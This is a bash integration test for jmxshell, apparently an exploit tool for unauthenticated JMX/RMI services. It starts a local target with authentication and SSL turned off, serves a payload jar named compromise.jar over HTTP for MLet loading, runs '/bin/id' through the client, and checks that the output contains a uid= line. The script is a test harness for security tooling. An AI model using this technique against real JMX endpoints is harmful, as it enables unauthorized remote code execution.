#!/usr/bin/env bash
#
# End-to-end test for jmxshell. Stands up the standalone vulnerable
# target (build/target/jmx-target.jar) on 127.0.0.1:1099 (no auth, no SSL),
# serves compromise.jar over HTTP, runs the matching jmxshell client, and
# asserts the `/bin/id` invocation came back with a uid= line.
#
# Usage:
#   scripts/integration-test.sh                # target JDK 8 by default
#   scripts/integration-test.sh 11             # use the jdk11 build
#   JAVA_HOME=/path/to/jdk21 scripts/integration-test.sh 21
#
# Env vars:
#   SKIP_BUILD=1   Skip the gradle build step (caller has already built)
#   HTTP_PORT      HTTP port for serving compromise.jar (default 8000)
#   JMX_PORT       JMX/RMI port the target listens on (default 1099)
#   ID_CMD         Path to id binary (defaults /bin/id, falls back to /usr/bin/id)
#   EXPECT_FAIL=1  Negative test: assert the exploit fails (exit non-zero)
#   EXPECT_ERROR   Substring required in output when EXPECT_FAIL=1
#                  (use this to pin the test to a specific failure mode,
#                  e.g. for JDK 25 targets where MLet has been removed)
#
# Requirements:
#   - python3 in PATH (HTTP server for compromise.jar / woot.html)
#   - A JDK reachable via JAVA_HOME or `java` on PATH

set -euo pipefail

TARGET_JDK="${1:-8}"

if [ -n "${JAVA_HOME:-}" ]; then
    JAVA="$JAVA_HOME/bin/java"
else
    JAVA="$(command -v java || true)"
fi
if [ -z "$JAVA" ]; then
    echo "Need java available (set JAVA_HOME or add a JDK to PATH)" >&2
    exit 1
fi

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORK="$(mktemp -d -t jmxshell-it.XXXXXX)"
HTTP_PORT="${HTTP_PORT:-8000}"
JMX_PORT="${JMX_PORT:-1099}"
TARGET_PID=""
HTTP_PID=""

cleanup() {
    set +e
    [ -n "$TARGET_PID" ] && kill "$TARGET_PID" 2>/dev/null
    [ -n "$HTTP_PID" ] && kill "$HTTP_PID" 2>/dev/null
    rm -rf "$WORK"
}
trap cleanup EXIT

cd "$ROOT"

echo "==> JDK in use:"
"$JAVA" -version

if [ "${SKIP_BUILD:-0}" = "1" ]; then
    echo "==> Skipping build (SKIP_BUILD=1) — expecting build artifacts in place"
    if ! ls build/libs/jmxshell-*.jar >/dev/null 2>&1; then
        echo "Missing build/libs/jmxshell-*.jar. Run the gradle build first." >&2
        exit 1
    fi
    if [ ! -f build/target/jmx-target.jar ]; then
        echo "Missing build/target/jmx-target.jar. Run gradle build (it produces this jar)." >&2
        exit 1
    fi
    if [ ! -f build/web/compromise.jar ] || [ ! -f build/web/woot.html ]; then
        echo "Missing build/web/{compromise.jar,woot.html}. Run gradle build mletFile -PmletUrl=http://127.0.0.1:${HTTP_PORT}" >&2
        exit 1
    fi
else
    echo "==> Building jmxshell + jmx-target with -PtargetJdk=${TARGET_JDK}"
    ./gradlew --no-daemon clean build mletFile \
        -PtargetJdk="${TARGET_JDK}" \
        -PmletUrl="http://127.0.0.1:${HTTP_PORT}" >/dev/null
fi

echo "==> Starting jmx-target.jar on 127.0.0.1:${JMX_PORT}"
"$JAVA" \
    -Dcom.sun.management.jmxremote \
    -Dcom.sun.management.jmxremote.port="${JMX_PORT}" \
    -Dcom.sun.management.jmxremote.rmi.port="${JMX_PORT}" \
    -Dcom.sun.management.jmxremote.authenticate=false \
    -Dcom.sun.management.jmxremote.ssl=false \
    -Dcom.sun.management.jmxremote.local.only=false \
    -Djava.rmi.server.hostname=127.0.0.1 \
    -jar build/target/jmx-target.jar >"$WORK/target.log" 2>&1 &
TARGET_PID=$!

echo "==> Serving build/web on http://127.0.0.1:${HTTP_PORT}"
( cd build/web && python3 -m http.server "${HTTP_PORT}" ) >"$WORK/http.log" 2>&1 &
HTTP_PID=$!

echo "==> Waiting for JMX port ${JMX_PORT}"
for i in $(seq 1 60); do
    if (echo > "/dev/tcp/127.0.0.1/${JMX_PORT}") 2>/dev/null; then
        break
    fi
    sleep 0.5
    if [ "$i" = "60" ]; then
        echo "JMX port never came up. target.log:" >&2
        cat "$WORK/target.log" >&2
        exit 1
    fi
done

CLIENT_JARS=( build/libs/jmxshell-*.jar )
CLIENT_JAR="${CLIENT_JARS[0]}"
echo "==> Running jmxshell client: $CLIENT_JAR"

# Default to /bin/id; on macOS the binary lives at /usr/bin/id so fall back.
ID_CMD="${ID_CMD:-/bin/id}"
if [ ! -x "$ID_CMD" ] && [ -x /usr/bin/id ]; then
    ID_CMD="/usr/bin/id"
fi
echo "==> Sending command: $ID_CMD"

set +e
OUT="$("$JAVA" -jar "$CLIENT_JAR" \
    --host 127.0.0.1 --port "${JMX_PORT}" \
    --command "$ID_CMD" \
    --url "http://127.0.0.1:${HTTP_PORT}" 2>&1)"
RC=$?
set -e

echo "----- jmxshell output (rc=$RC) -----"
echo "$OUT"
echo "------------------------------------"

if [ "${EXPECT_FAIL:-0}" = "1" ]; then
    if [ "$RC" -eq 0 ]; then
        echo "FAIL: expected jmxshell to exit non-zero (EXPECT_FAIL=1) but it succeeded" >&2
        exit 1
    fi
    if [ -n "${EXPECT_ERROR:-}" ] && ! echo "$OUT" | grep -qF "$EXPECT_ERROR"; then
        echo "FAIL: expected error substring not found in output" >&2
        echo "  expected: $EXPECT_ERROR" >&2
        exit 1
    fi
    echo "PASS: exploit correctly failed against this target${EXPECT_ERROR:+ (matched: $EXPECT_ERROR)}"
    exit 0
fi

if [ "$RC" -ne 0 ]; then
    echo "FAIL: jmxshell exited non-zero ($RC)" >&2
    exit 1
fi

if echo "$OUT" | grep -Eq 'Result:[[:space:]]*uid='; then
    echo "PASS: id command returned a uid= line via JMX"
    exit 0
fi

echo "FAIL: did not see 'Result: uid=...' in jmxshell output" >&2
exit 1
